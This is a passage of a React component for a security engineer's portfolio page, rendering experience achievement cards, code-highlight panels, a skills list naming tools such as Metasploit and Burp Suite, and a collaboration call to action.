                  <div className="grid md:grid-cols-2 gap-6 mb-10">
                    {experience.achievements.map((achievement, idx) => (
                      <div 
                        key={idx}
                        className="glass p-6 rounded-xl border border-white/10 transition-all duration-300 hover:border-white/30 hover:shadow-lg"
                        style={{ 
                          transitionDelay: `${idx * 0.1}s`,
                          opacity: isVisible[`achieve-${experience.id}`] ? 1 : 0,
                          transform: isVisible[`achieve-${experience.id}`] ? 'translateY(0)' : 'translateY(20px)',
                          transition: `opacity 0.5s ease, transform 0.5s ease`,
                          transitionDelay: `${idx * 0.1 + 0.3}s`
                        }}
                      >
                        <h4 className="text-xl font-bold mb-3 text-pink-400">{achievement.title}</h4>
                        <p className="text-gray-300 mb-4">{achievement.description}</p>
                        
                        {achievement.tech && (
                          <div className="flex flex-wrap gap-2">
                            {achievement.tech.map(tech => (
                              <span key={tech} className="px-3 py-1 bg-white/5 rounded-full text-sm border border-white/10">
                                {tech}
                              </span>
                            ))}
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                  
                  {/* Code Highlights */}
                  {experience.codeHighlights && (
                    <div className="space-y-8">
                      {experience.codeHighlights.map((highlight, idx) => (
                        <div 
                          key={idx}
                          className="glass rounded-xl overflow-hidden border border-white/10 transition-all duration-300 hover:border-white/20"
                          style={{ 
                            transitionDelay: `${idx * 0.2}s`,
                            opacity: isVisible[`achieve-${experience.id}`] ? 1 : 0,
                            transform: isVisible[`achieve-${experience.id}`] ? 'translateY(0)' : 'translateY(20px)',
                            transition: `opacity 0.6s ease, transform 0.6s ease`,
                            transitionDelay: `${idx * 0.2 + 0.5}s`
                          }}
                        >
                          <div className="bg-gray-900 px-4 py-3 flex justify-between items-center">
                            <div className="flex items-center gap-3">
                              <div className="flex gap-1.5">
                                <div className="w-3 h-3 rounded-full bg-red-500"></div>
                                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                                <div className="w-3 h-3 rounded-full bg-green-500"></div>
                              </div>
                              <h5 className="font-medium">{highlight.title}</h5>
                            </div>
                            <div className="flex gap-2">
                              <span className="text-xs px-2 py-1 rounded bg-blue-500/20 text-blue-400">
                                {highlight.language}
                              </span>
                              <button 
                                onClick={() => copyToClipboard(highlight.code)}
                                className="text-gray-400 hover:text-white transition-colors"
                              >
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
                                </svg>
                              </button>
                            </div>
                          </div>
                          <div className="p-4 overflow-x-auto bg-gray-950 text-gray-300 font-mono text-sm">
                            <pre>{highlight.code}</pre>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )
            ))}
          </div>
        </div>
      </section>

      {/* Skills Summary */}
      <section 
        id="skills-summary"
        ref={el => registerSection('skills-summary', el)}
        className="py-20 px-4 relative overflow-hidden"
      >
        <div className="absolute -top-40 right-0 w-96 h-96 bg-pink-500/5 rounded-full blur-3xl"></div>
        <div className="container mx-auto relative z-10">
          <div className={`transition-all duration-700 ${isVisible['skills-summary'] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'}`}>
            <h2 className="text-4xl font-bold mb-12 text-center">Technical Expertise</h2>
            
            <div className="max-w-4xl mx-auto glass p-8 rounded-xl border border-white/10 backdrop-blur-lg">
              {/* Skill Categories */}
              <div className="grid md:grid-cols-3 gap-8">
                <div>
                  <h3 className="text-xl font-bold mb-4 text-pink-400">Security Engineering</h3>
                  <ul className="space-y-2">
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Vulnerability Research</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Penetration Testing</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Exploit Development</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Network Security</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Reverse Engineering</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Secure Architecture</span>
                    </li>
                  </ul>
                </div>
                
                <div>
                  <h3 className="text-xl font-bold mb-4 text-pink-400">Programming</h3>
                  <ul className="space-y-2">
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Python</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>C/C++</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>JavaScript/TypeScript</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Bash/Shell Scripting</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Rust</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Assembly (x86/ARM)</span>
                    </li>
                  </ul>
                </div>
                
                <div>
                  <h3 className="text-xl font-bold mb-4 text-pink-400">Tools & Platforms</h3>
                  <ul className="space-y-2">
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Ghidra & IDA Pro</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Metasploit Framework</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Burp Suite Professional</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>Docker & Kubernetes</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>AWS & Azure</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <span className="text-pink-500">•</span>
                      <span>TensorFlow & PyTorch</span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Call to Action */}
      <section 
        id="cta-section"
        ref={el => registerSection('cta-section', el)}
        className="py-20 px-4 bg-gradient-to-r from-pink-900/20 to-purple-900/20"
      >
        <div className="container mx-auto">
          <div className={`max-w-3xl mx-auto text-center transition-all duration-700 ${isVisible['cta-section'] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'}`}>
            <h2 className="text-3xl md:text-4xl font-bold mb-6">Interested in Collaboration?</h2>
            <p className="text-xl text-gray-300 mb-8">
              I'm always looking for interesting cybersecurity challenges and collaborative opportunities.
            </p>
            <div className="flex justify-center gap-6">
              <Link 
                to="/projects" 
                className="px-6 py-3 bg-gradient-to-r from-pink-600 to-purple-600 rounded-full hover:scale-105 transition-all"
              >
                View Projects
              </Link>
              <Link 
                to="/contact" 
                className="px-6 py-3 bg-transparent border border-white/30 rounded-full hover:bg-white/10 hover:border-white/50 transition-all"
              >
                Get In Touch
              </Link>
            </div>
          </div>
        </div>
      </section>

      {/* Add custom style block for shadow-glow */}
      <style jsx>{`
        .shadow-glow {
          box-shadow: 0 0 15px rgba(236, 72, 153, 0.5);
        }
      `}</style>
    </div>
  );
}
